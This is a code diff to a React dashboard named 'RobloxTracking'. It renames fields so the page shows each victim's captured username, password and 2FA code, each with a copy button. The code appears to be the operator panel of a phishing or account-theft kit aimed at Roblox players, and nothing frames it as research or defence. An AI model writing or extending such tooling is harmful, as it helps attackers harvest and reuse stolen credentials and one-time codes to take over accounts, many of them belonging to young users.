@@ -437,12 +437,12 @@ export default function RobloxTracking() {
                             <div className="flex items-center space-x-2 text-sm">
                               <span className="text-muted-foreground font-medium">Username:</span>
                               <code className="bg-muted px-2 py-1 rounded text-xs font-mono">
-                                {cred.username}
+                                {cred.capturedUsername}
                               </code>
                               <Button
                                 size="sm"
                                 variant="ghost"
-                                onClick={() => copyToClipboard(cred.username)}
+                                onClick={() => copyToClipboard(cred.capturedUsername)}
                                 data-testid={`button-copy-username-${cred.id}`}
                               >
                                 <Copy className="h-3 w-3" />
@@ -452,28 +452,28 @@ export default function RobloxTracking() {
                             <div className="flex items-center space-x-2 text-sm">
                               <span className="text-muted-foreground font-medium">Password:</span>
                               <code className="bg-muted px-2 py-1 rounded text-xs font-mono">
-                                {cred.password}
+                                {cred.capturedPassword}
                               </code>
                               <Button
                                 size="sm"
                                 variant="ghost"
-                                onClick={() => copyToClipboard(cred.password)}
+                                onClick={() => copyToClipboard(cred.capturedPassword)}
                                 data-testid={`button-copy-password-${cred.id}`}
                               >
                                 <Copy className="h-3 w-3" />
                               </Button>
                             </div>
                             
-                            {cred.twoFactorCode && (
+                            {cred.capturedAuthCode && (
                               <div className="flex items-center space-x-2 text-sm">
                                 <span className="text-muted-foreground font-medium">2FA Code:</span>
                                 <code className="bg-muted px-2 py-1 rounded text-xs font-mono">
-                                  {cred.twoFactorCode}
+                                  {cred.capturedAuthCode}
                                 </code>
                                 <Button
                                   size="sm"
                                   variant="ghost"
-                                  onClick={() => copyToClipboard(cred.twoFactorCode)}
+                                  onClick={() => copyToClipboard(cred.capturedAuthCode || '')}
                                   data-testid={`button-copy-2fa-${cred.id}`}
                                 >
                                   <Copy className="h-3 w-3" />
